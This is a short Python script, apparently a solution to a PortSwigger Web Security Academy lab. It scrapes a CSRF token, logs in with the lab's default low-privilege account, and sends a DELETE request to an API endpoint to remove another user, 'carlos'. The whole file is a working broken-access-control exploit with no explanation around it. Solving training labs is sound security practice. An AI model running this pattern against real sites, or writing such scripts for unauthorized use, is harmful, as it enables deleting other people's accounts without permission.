import requests

HOST = "0abe00e60444b38481d585d0003800a5.web-security-academy.net"

HEADERS = {
    "Host": HOST,
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "session="
}

def get_csrf_login():
    url = f"https://{HOST}/login"
    response = requests.get(url, headers=HEADERS)
    csrf = response.text.split("csrf\" value=\"")[1].split("\"")[0]
    HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
    print("CSRF token:", csrf)
    return csrf

def login():
    url = f"https://{HOST}/login"
    csrf = get_csrf_login()
    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }
    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
    print("Logged in, cookie:", HEADERS["Cookie"])

def delete_user():
    url = f"https://{HOST}/api/user/carlos"

    response = requests.delete(url, headers=HEADERS)

    print(response.text)
    print(response.headers)

login()
delete_user()